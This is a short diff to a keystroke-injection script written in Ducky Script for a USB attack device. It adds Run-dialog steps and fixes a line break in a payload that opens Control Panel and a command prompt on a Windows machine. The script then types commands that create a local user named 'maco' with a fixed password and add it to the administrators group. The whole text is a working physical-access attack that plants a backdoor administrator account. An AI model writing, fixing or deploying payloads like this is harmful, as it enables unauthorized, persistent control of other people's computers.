@@ -2,6 +2,8 @@ DELAY 350
 TAB
 ENTER
 DELAY 350
+GUI r
+DELAY 350
 STRING control panel
 DELAY 350
 ENTER
@@ -84,13 +86,16 @@ TAB
 DELAY 350
 ENTER
 DELAY 350
+GUI r
+DELAY 350
 STRING cmd
 DELAY 350
 LEFTARROW
 DELAY 350
 ENTER
 DELAY 350
-STRING net user maco tatt /addDELAY
+STRING net user maco tatt /add
+DELAY 350
 ENTER
 DELAY 350
 STRING net localgroup administrators maco /add
